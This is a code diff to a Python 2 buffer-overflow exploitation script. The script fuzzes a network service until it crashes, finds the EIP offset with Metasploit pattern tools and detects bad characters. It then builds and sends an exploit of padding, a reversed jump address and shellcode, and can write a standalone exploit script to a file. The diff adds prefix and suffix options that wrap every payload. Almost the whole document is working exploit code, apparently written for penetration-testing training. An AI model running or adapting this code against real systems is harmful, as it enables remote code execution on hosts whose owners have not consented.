@@ -17,12 +17,15 @@ port = None
 debug = False
 outputFile = None
 help = False
-
+prefix = ""
+suffix = ""
 
 
 parser = ArgumentParser()
 parser.add_argument("-o", "--output", default=False, help="Write payload script to FILE", metavar="FILE")
 parser.add_argument("-b", "--badchars", action="store_true", default=False, help="Attempt to detect bad characters with your debugger of choice")
+parser.add_argument("-p", "--prefix", default="", help="Append a prefix to the beginning of your overflow string")
+parser.add_argument("-s", "--suffix", default="", help="Append a suffix to the end of your overflow string")
 parser.add_argument("host", help="The host executing the vulnerable application (usually your debugger)")
 parser.add_argument("port", type=int, help="The port the application is running on")
 
@@ -33,6 +36,8 @@ outputFile = arguments["output"]
 debug = arguments["badchars"]
 host = arguments["host"]
 port = arguments["port"]
+prefix = arguments["prefix"]
+suffix = arguments["suffix"]
 
 
 
@@ -59,14 +64,14 @@ for string in buffer:
 			print "(*) Service crashed at " + str(bytesToOverflow) + " bytes"
 			break
 		print "(-) Fuzzing parameter with %s bytes" % len(string)
-		s.send(string) #IF YOU WANT TO EDIT DATA SENT, DO IT HERE
+		s.send(str(prefix) + string + str(suffix))
 		s.close()
 		bytesToOverflow = len(string)
 
 print "\nPlease restart the vulnerable application and your debugger. Press enter to continue"
 raw_input()
 print "(-) Generating unique pattern to obtain exact offset"
-uniqueString = os.popen("msf-pattern_create -l " + str(bytesToOverflow)).read()#Use this and pattern_offset to get exact offset
+uniqueString = os.popen("msf-pattern_create -l " + str(bytesToOverflow)).read()	#Use this and pattern_offset to get exact offset
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(TIMEOUT)
 while True:					#We'll try again if we can't connect
@@ -77,7 +82,7 @@ while True:					#We'll try again if we can't connect
 		print "(!) Could not connect to " + str(host)
 		print "\nPress enter to try again"
 		continue
-	s.send(uniqueString) #IF YOU WANT TO EDIT DATA SENT, DO IT HERE TOO
+	s.send(str(prefix) + uniqueString + str(suffix))
 	s.close()
 	break
 
@@ -90,7 +95,11 @@ print "(-) Locating offset of EIP on the stack"
 offsetString = os.popen("msf-pattern_offset -q " + eip).read().split()	#Grab each word of output
 offset = int(offsetString[-1])	#Last word of this command is the offset
 
-print "(*) Exact match at offset " + str(offset)
+if prefix:
+	print "(*) Exact match at offset " + str(offset) + " (does not include the prefix)"
+else:
+	print "(*) Exact match at offset " + str(offset)
+
 
 
 if debug:
@@ -123,10 +132,10 @@ if debug:
                 			print "\nPress enter to try again"
                 			continue
 	        		if int(offset) > len(badCharList):
-					s.send("".join(badCharList) + "A"*(offset - len(badCharList)) + "BBBB") #IF YOU WANT TO EDIT DATA SENT, DO IT HERE
+					s.send(str(prefix) + "".join(badCharList) + "A"*(offset - len(badCharList)) + "BBBB" + str(suffix))
 				else:
 					print "Could not find enough space before overflow. Attempting to insert character list after offset (may fail)"
-					s.send(str("A"*offset +"BBBB").join(badCharList)) #IF YOU WANT TO EDIT DATA SENT, DO IT HERE
+					s.send(str(prefix) + str("A"*offset + "BBBB") + "".join(badCharList) + str(suffix))
        		 		s.close()
         			break
 			print "\nPlease open your debugger and copy/paste the dump output from the beginning of the stack to least 256 bytes. Enter 2 newlines to stop or 'q' to terminate bad character detection."
@@ -226,9 +235,9 @@ while True:
 	print "Not correct length for a 32-bit address. Try again"
 
 if not insertBefore:	#Here we change it to Little Endian for you. That's always a pain to do manually.
-	exploit = "A"*offset + jump[::-1] + buf
+	exploit = prefix + "A"*offset + jump[::-1] + buf + suffix
 else:
-	exploit = buf + "A"*(offset - len(buf)) + jump[::-1]
+	exploit = prefix + buf + "A"*(offset - len(buf)) + jump[::-1] + suffix
 
 
 evil.replace("0x","\\x")
@@ -243,9 +252,9 @@ if outputFile:
 	malware = "#!/usr/bin/python\nimport socket\n" + payload
 	malware += "buf = \"\\x90\"*16 + buf"		#NOP Sled
 	if insertBefore:
-		malware += "\nexploit = buf + \"A\"*(" + str(offset) + "-len(buf)) + \"" + evil + "\""
+		malware += "\nexploit = \"" + str(prefix) + "\" + buf + \"A\"*(" + str(offset) + "-len(buf)) + \"" + evil + suffix + "\""
 	else:
-		malware += "\nexploit = \"A\"*" + str(offset) + " + \"" + evil + "\" + buf"
+		malware += "\nexploit = \"" + str(prefix) + "\" + \"A\"*" + str(offset) + " + \"" + evil + "\" + buf + \"" + str(suffix) + "\""
 	malware += "\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nprint \"(-)Sending exploit...\""
 	malware += "\ns.connect((\"" + host + "\"," + str(port) + "))\n"
 	malware += "data=s.recv(1024)\nprint data\ns.send(exploit)\ns.close()"
@@ -256,7 +265,12 @@ if outputFile:
 
 
 print "Exploit ready. Launch? (y/n)"
-if "n" in raw_input(">> ").lower():
+while True:
+	answer = raw_input(">> ").lower()
+	if answer == "y" or answer == "n":
+		break
+
+if answer == "n":
 	pass
 else:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
